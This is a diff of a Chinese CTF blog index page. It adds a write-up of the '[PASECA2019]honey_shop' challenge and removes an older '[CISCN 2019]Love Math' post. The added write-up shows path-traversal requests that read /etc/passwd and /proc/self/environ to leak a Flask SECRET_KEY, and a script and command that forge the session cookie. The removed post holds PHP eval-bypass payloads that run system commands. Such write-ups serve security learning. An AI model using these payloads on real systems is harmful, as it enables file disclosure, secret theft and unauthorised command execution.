@@ -286,6 +286,182 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/08/20210308/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="花间一壶酒">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2021/03/08/20210308/" itemprop="url">（PASECA2019）honey_shop</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-03-08T22:17:45+08:00">
+                2021-03-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="PASECA2019-honey-shop"><a href="#PASECA2019-honey-shop" class="headerlink" title="[PASECA2019]honey_shop"></a>[PASECA2019]honey_shop</h2><p><img src="https://img-blog.csdnimg.cn/20210314104027523.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>一个蜂蜜商店的界面，有1366美金，想要购买flag需要1337美金。</p>
+<p>直接购买，提示金币不足。</p>
+<p><img src="https://img-blog.csdnimg.cn/20210314104131875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>猜测可能是传参时存在金额参数或者cookie中，使用BurpSuite抓取数据包：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210314104344192.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>其中item应该为商品序号，获取到其中的session：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session=eyJiYWxhbmNlIjoxMzM2LCJwdXJjaGFzZXMiOltdfQ.YE130g.YeAlrt_D3MkU1cOH6Q_Agy4YFX0</span><br></pre></td></tr></table></figure>
+
+<p>使用Python脚本解密session：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line">from base64 <span class="keyword">import</span> b64decode</span><br><span class="line">from flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line">from itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">decryption</span><span class="params">(payload)</span>:</span></span><br><span class="line">    payload, sig = payload.rsplit(b&#x27;.&#x27;, 1)</span><br><span class="line">    payload, timestamp = payload.rsplit(b<span class="number">&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = False</span><br><span class="line">    <span class="keyword">if</span> payload.startswith(b<span class="number">&#x27;.&#x27;</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = True</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        raise Exception(&#x27;Could not base64 decode the payload because of &#x27;</span><br><span class="line">                        &#x27;an exception&#x27;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            raise Exception(&#x27;Could not zlib decompress the payload before &#x27;</span><br><span class="line">                            &#x27;decoding the payload&#x27;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print(decryption(sys.argv[<span class="number">1</span>].encode()))</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210314104822207.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;balance&#x27;: 1336, &#x27;purchases&#x27;: []&#125;</span><br></pre></td></tr></table></figure>
+<p>其中balance应该为当前余额，purchases值为空。<br>伪造session，修改余额，所以需要SECRET_KEY的值。</p>
+<p>又发现</p>
+<p><img src="https://img-blog.csdnimg.cn/20210314104928519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>bp抓包。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/download?image=<span class="number">1.</span>jpg</span><br></pre></td></tr></table></figure>
+<p>修改其image的值为：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/download?image=../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+<p>得到/etc/passwd文件内容：<br><img src="https://img-blog.csdnimg.cn/202103141051149.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>尝试访问Python环境变量：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/proc/self</span><br><span class="line"><span class="comment">// 其路径指向当前进程</span></span><br><span class="line"></span><br><span class="line">/environ</span><br><span class="line"><span class="comment">// 记录当前进程的环境变量信息</span></span><br></pre></td></tr></table></figure>
+<p>当路径为<code>../../proc/self/environ</code>时，</p>
+<p><img src="https://img-blog.csdnimg.cn/2021031410522527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>得到了SECRET_KEY的值为：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Z41PIEM7s61GEk6zbMAlI9PBevYdFHKSqOsfmDrS</span><br></pre></td></tr></table></figure>
+
+<p>使用flask-session-cookie加密脚本</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s <span class="string">&quot;Z41PIEM7s61GEk6zbMAlI9PBevYdFHKSqOsfmDrS&quot;</span> -t <span class="string">&quot;&#123;&#x27;balance&#x27;: 1338, &#x27;purchases&#x27;: []&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJiYWxhbmNlIjoxMzM4LCJwdXJjaGFzZXMiOltdfQ.YE18RA.P1vDc4M0tQL1b9X7hn3jCmFyJ4k</span><br></pre></td></tr></table></figure>
+<p>修改session的值，购买成功，得到flag。</p>
+<p><img src="https://img-blog.csdnimg.cn/20210314110128745.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/27/XSS+%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1868,160 +2044,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/08/20210208/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="花间一壶酒">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2021/02/08/20210208/" itemprop="url">（CISCN 2019 初赛）Love Math</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-02-08T17:17:45+08:00">
-                2021-02-08
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index">
-                    <span itemprop="name">web</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><p><img src="https://img-blog.csdnimg.cn/2021020922171893.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">scandir() 函数：返回指定目录中的文件和目录的数组。</span><br><span class="line">base_convert() 函数：在任意进制之间转换数字。</span><br><span class="line">dechex() 函数：把十进制转换为十六进制。</span><br><span class="line">hex2bin() 函数：把十六进制值的字符串转换为 ASCII 字符。</span><br><span class="line">var_dump() ：函数用于输出变量的相关信息。</span><br><span class="line">readfile() 函数：输出一个文件。该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回 <span class="literal">false</span>。您可以通过 @readfile() 形式调用该函数，来隐藏错误信息。</span><br><span class="line">语法：readfile(filename,include_path,context)</span><br></pre></td></tr></table></figure>
-<p>需要绕后正则和白名单，最后通过eval执行php代码。类似于通过异或等运算构造payload，这里需要用到的是白名单里的math函数。</p>
-<p> base_convert()函数<br><img src="https://img-blog.csdnimg.cn/20210209222143419.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">通过构造<code>base_convert(696468,10,36)</code> 得到 <code>base_convert(696468,10,36)=exec</code></p>
-<p>通过exec执行传入的命令，如exec($_GET[‘xxx’]) ，但是过滤了</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$blacklist = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br></pre></td></tr></table></figure>
-<p>通过 getallheaders()函数，会返回Request参数和内容，只针对于Apache。<br><img src="https://img-blog.csdnimg.cn/20210209222314222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">构造<code>base_convert(8768397090111664438,10,30)</code> 的结果是<code>getallheaders</code><br>通过php的动态函数执行，设置变量 <code>$pi</code>(防止被过滤) <code>$pi=base_convert</code></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=$pi=base_convert,$pi(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)($pi(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>)()&#123;<span class="number">1</span>&#125;)</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210209222831580.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>或者</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?c=$pi=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));($$pi)&#123;pi&#125;(($$pi)&#123;<span class="built_in">abs</span>&#125;)&amp;pi=system&amp;<span class="built_in">abs</span>=ls%<span class="number">20</span>/</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210209221912918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?c=$pi=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));($$pi)&#123;pi&#125;(($$pi)&#123;<span class="built_in">abs</span>&#125;)&amp;pi=system&amp;<span class="built_in">abs</span>=cat%<span class="number">20</span>/flag</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210209221948217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43940853/article/details/104332132">https://blog.csdn.net/weixin_43940853/article/details/104332132</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2072,7 +2094,7 @@
               
                 <a href="/archives%7C%7C%20archive">
               
-                  <span class="site-state-item-count">61</span>
+                  <span class="site-state-item-count">62</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2094,7 +2116,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">87</span>
+                  <span class="site-state-item-count">88</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
